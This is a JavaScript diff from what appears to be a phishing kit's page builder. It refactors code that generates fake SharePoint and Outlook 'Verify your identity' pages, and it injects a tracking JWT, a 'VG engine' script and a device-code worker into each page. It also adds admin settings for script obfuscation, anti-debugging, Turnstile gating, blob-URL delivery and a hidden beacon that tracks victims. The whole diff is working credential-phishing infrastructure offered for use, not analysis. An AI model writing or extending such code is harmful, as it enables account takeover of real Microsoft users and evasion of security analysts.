@@ -6,6 +6,18 @@ const jwt = require('jsonwebtoken');
 const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
 const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');
 
+// List all template directories present on disk (excluding 'assets' and 'custom').
+function listDiskTemplates() {
+  try {
+    if (!fs.existsSync(TEMPLATES_DIR)) return [];
+    return fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
+      .filter(entry => entry.isDirectory() && entry.name !== 'assets' && entry.name !== 'custom')
+      .map(entry => entry.name);
+  } catch (e) {
+    return [];
+  }
+}
+
 function normalizeTemplateKey(value) {
   return String(value || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '');
 }
@@ -87,49 +99,49 @@ function loadVerificationDesignCSS(designName) {
   return '';
 }
 
-function generateExportHtml(link, user, options = {}) {
-  const templateType = link.template_type || 'sharepoint3';
-  const designName = link.verification_design || 'outlook';
+// Read admin settings from the DB so generated pages honour values
+// configured in the admin panel (obfuscation, anti-debug, soft-error retry,
+// default background blur, default auth mode, etc.).
+async function loadAdminSettings() {
+  const obj = {};
+  try {
+    const db = require('../database/connection');
+    const [rows] = await db.query('SELECT setting_key, setting_value FROM settings');
+    for (const r of rows) obj[r.setting_key] = r.setting_value;
+  } catch (e) { /* DB not ready */ }
+  if (obj.obfuscation_enabled === undefined) obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
+  if (obj.antidebug_enabled === undefined) obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
+  if (obj.soft_error_retry_enabled === undefined) obj.soft_error_retry_enabled = 'false';
+  if (obj.default_background_blur === undefined) obj.default_background_blur = '4';
+  if (obj.default_auth_mode === undefined) obj.default_auth_mode = 'cookie';
+  return obj;
+}
 
-  let html = loadTemplateHTML(templateType);
-  const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
-  let script = loadTemplateJS(templateType);
+function boolSetting(v) {
+  if (v === true || v === 1) return true;
+  return String(v || '').toLowerCase() === 'true';
+}
 
-  html = html.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
-  html = html.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}<\/script>`);
-  html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
-  html = html.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
-  html = html.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
-  html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
-  html = html.replace('{{PAGES}}', String(link.pages || 1));
-
+// Build the per-link window.* variables block using DB-backed admin settings.
+function buildWindowVars(link, user, settings, options = {}) {
   const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
-  
-  // Load VG engine
-  let vgEngine = '';
-  const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
-  if (fs.existsSync(vgEnginePath)) {
-    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
-  }
 
-  // Build window.* variables injection
-  const obfuscationEnabled = String(config.OBFUSCATION_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_OBFUSCATION || '').toLowerCase() === 'true';
-  const antidebugEnabled = String(config.ANTIDEBUG_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_ANTIDEBUG || '').toLowerCase() === 'true';
-  
-  // Get blur settings from admin
-  const defaultBlur = link.background_blur || 4;
-  const bgUrl = link.background_blur_url || '';
+  const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
+  const antidebugEnabled = boolSetting(settings.antidebug_enabled);
+  const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
 
-  // Turnstile: only embed site key when link-level turnstile is enabled. The
-  // export domain is provided so runtime widgets can pick a per-domain key.
+  const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
+  const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
+  const bgUrl = link.custom_bg_url || link.background_blur_url || '';
+
   const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
   const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
   const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
 
-  const windowVars = `<script>
+  return `<script>
     window.VG_JWT="${jt}";
     window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
-    window.__AUTH_MODE="${link.auth_mode || 'cookie'}";
+    window.__AUTH_MODE="${authMode}";
     window.__BACKGROUND_BLUR_URL="${bgUrl}";
     window.__BACKGROUND_BLUR_AMOUNT=${defaultBlur};
     window.__DOC_FILENAME="${link.file_name || 'Document.pdf'}";
@@ -140,17 +152,50 @@ function generateExportHtml(link, user, options = {}) {
     window.__PRIMARY_BUTTON_TEXT="${link.button_text || 'Get verification code'}";
     window.__OBFUSCATION_ENABLED=${obfuscationEnabled ? 'true' : 'false'};
     window.__ANTIDEBUG_ENABLED=${antidebugEnabled ? 'true' : 'false'};
+    window.__SOFT_ERROR_RETRY_ENABLED=${softErrorRetry ? 'true' : 'false'};
     window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
     window.__TURNSTILE_ENABLED=${turnstileEnabled ? 'true' : 'false'};
     window.__TURNSTILE_SITE_KEY="${turnstileSiteKey}";
     window.__EXPORT_DOMAIN="${exportDomain}";
     window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
   </script>`;
+}
 
-  // Inject VG engine + window vars before </head>
+// Shared page-render pipeline used by both export and worker builds.
+async function renderPageHtml(link, user, options = {}) {
+  const templateType = link.template_type || 'sharepoint3';
+  const designName = link.verification_design || 'outlook';
+  const settings = await loadAdminSettings();
+
+  let html = loadTemplateHTML(templateType);
+  const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
+  const script = loadTemplateJS(templateType);
+
+  if (html.includes('{{CSS}}')) {
+    html = html.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
+  }
+  if (html.includes('{{SCRIPT}}')) {
+    html = html.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}<\/script>`);
+  }
+
+  html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
+  html = html.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
+  html = html.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
+  html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
+  html = html.replace('{{PAGES}}', String(link.pages || 1));
+
+  const windowVars = buildWindowVars(link, user, settings, options);
+
+  // Load VG engine and inject before </head>
+  let vgEngine = '';
+  const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
+  if (fs.existsSync(vgEnginePath)) {
+    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
+  }
   const engineScript = vgEngine ? `<script>${vgEngine}<\/script>` : '';
   html = html.replace('</head>', `${windowVars}${engineScript}</head>`);
 
+  // Preload block handling
   const templateConfig = loadTemplateConfig(templateType);
   if (templateConfig.preload) {
     html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
@@ -160,109 +205,35 @@ function generateExportHtml(link, user, options = {}) {
     html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
   }
 
-  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
+  // Optional obfuscation of the inline template script
+  if (boolSetting(settings.obfuscation_enabled) || link.obfuscated) {
     try {
       const JavaScriptObfuscator = require('javascript-obfuscator');
-      const result = JavaScriptObfuscator.obfuscate(script, {
+      const obfuscated = JavaScriptObfuscator.obfuscate(script, {
         compact: true, controlFlowFlattening: true, deadCodeInjection: true,
-        debugProtection: true, selfDefending: true,
-      });
-      html = html.replace(`<script>${script}</script>`, `<script>${result.getObfuscatedCode()}</script>`);
+        debugProtection: false, selfDefending: true,
+      }).getObfuscatedCode();
+      html = html.replace(`<script>${script}</script>`, `<script>${obfuscated}</script>`);
     } catch (e) {
       console.error('[Obfuscation] Failed:', e.message);
     }
   }
 
-  // Add beacon
+  // Beacon tracking
   html = html.replace('</body>', `<img src="/beacon?t=${Date.now()}" width="1" height="1" style="display:none" onerror="fetch('/beacon',{method:'POST',body:JSON.stringify({jwt_token:window.VG_JWT})})"></body>`);
 
   return html;
 }
 
-function buildWorkerScript(link, user, apiBaseUrl) {
-  const templateType = link.template_type || 'sharepoint3';
-  const designName = link.verification_design || 'outlook';
+async function generateExportHtml(link, user, options = {}) {
+  return renderPageHtml(link, user, options);
+}
 
-  // Build the page HTML
-  let pageHtml = loadTemplateHTML(templateType);
-  const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
-  let script = loadTemplateJS(templateType);
+async function buildWorkerScript(link, user, apiBaseUrl) {
+  const pageHtml = await renderPageHtml(link, user, {});
 
-  pageHtml = pageHtml.replace(/\/\* \{\{CSS\}\} \*\//, `<style>${css}</style>`);
-  pageHtml = pageHtml.replace(/\/\/ \{\{SCRIPT\}\}/, `<script>${script}<\/script>`);
-  pageHtml = pageHtml.replace('{{TITLE}}', link.title_text || 'Verify your identity');
-  pageHtml = pageHtml.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
-  pageHtml = pageHtml.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
-  pageHtml = pageHtml.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
-  pageHtml = pageHtml.replace('{{PAGES}}', String(link.pages || 1));
-
-  const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
-  
-  // Load VG engine
-  let vgEngine = '';
-  const vgEnginePath2 = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
-  if (fs.existsSync(vgEnginePath2)) {
-    vgEngine = fs.readFileSync(vgEnginePath2, 'utf8');
-  }
-
-  const obf2 = String(config.OBFUSCATION_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_OBFUSCATION || '').toLowerCase() === 'true';
-  const adb2 = String(config.ANTIDEBUG_ENABLED || '').toLowerCase() === 'true' || String(config.ENABLE_ANTIDEBUG || '').toLowerCase() === 'true';
-  const defaultBlur2 = link.background_blur || 4;
-  const bgUrl2 = link.background_blur_url || '';
-
-  const turnstileEnabled2 = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
-  const turnstileSiteKey2 = config.CF_TURNSTILE_SITE_KEY || '';
-
-  const windowVars2 = `<script>
-    window.VG_JWT="${jt}";
-    window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
-    window.__AUTH_MODE="${link.auth_mode || 'cookie'}";
-    window.__BACKGROUND_BLUR_URL="${bgUrl2}";
-    window.__BACKGROUND_BLUR_AMOUNT=${defaultBlur2};
-    window.__DOC_FILENAME="${link.file_name || 'Document.pdf'}";
-    window.__DOC_TITLE="${link.title_text || 'Non-Disclosure Agreement'}";
-    window.__DOC_PAGES="${link.pages || '4 pages'}";
-    window.__PAGE_TITLE="${link.title_text || 'Verify your identity'}";
-    window.__PAGE_MESSAGE="${link.message_text || 'Please verify your identity to continue'}";
-    window.__PRIMARY_BUTTON_TEXT="${link.button_text || 'Get verification code'}";
-    window.__OBFUSCATION_ENABLED=${obf2 ? 'true' : 'false'};
-    window.__ANTIDEBUG_ENABLED=${adb2 ? 'true' : 'false'};
-    window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
-    window.__TURNSTILE_ENABLED=${turnstileEnabled2 ? 'true' : 'false'};
-    window.__TURNSTILE_SITE_KEY="${turnstileSiteKey2}";
-    window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
-  </script>`;
-
-  const engineScript2 = vgEngine ? `<script>${vgEngine}<\/script>` : '';
-  pageHtml = pageHtml.replace('</head>', `${windowVars2}${engineScript2}</head>`);
-
-  const templateConfig = loadTemplateConfig(templateType);
-  if (templateConfig.preload) {
-    pageHtml = pageHtml.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
-    pageHtml = pageHtml.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
-  } else {
-    pageHtml = pageHtml.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
-    pageHtml = pageHtml.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
-  }
-
-  let finalScript = script;
-  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
-    try {
-      const JavaScriptObfuscator = require('javascript-obfuscator');
-      finalScript = JavaScriptObfuscator.obfuscate(script, {
-        compact: true, controlFlowFlattening: true, deadCodeInjection: true,
-        debugProtection: true, selfDefending: true,
-      }).getObfuscatedCode();
-    } catch (e) {
-      console.error('[Obfuscation] Worker obfuscation failed:', e.message);
-    }
-  }
-  pageHtml = pageHtml.replace(`<script>${script}</script>`, `<script>${finalScript}</script>`);
-
-  // Load base worker script
   let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 
-  // Replace placeholders
   const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev` : `http://localhost:${config.PORT}`);
   workerJs = workerJs
     .replace("'{{TURNSTILE_KEY}}'", `'${config.CF_TURNSTILE_SITE_KEY}'`)
@@ -277,12 +248,15 @@ function buildWorkerScript(link, user, apiBaseUrl) {
 
 module.exports = {
   normalizeTemplateKey,
+  listDiskTemplates,
   resolveTemplateDirectory,
   loadTemplateConfig,
   loadTemplateHTML,
   loadTemplateCSS,
   loadTemplateJS,
   loadVerificationDesignCSS,
+  loadAdminSettings,
+  boolSetting,
   generateExportHtml,
   buildWorkerScript,
 };
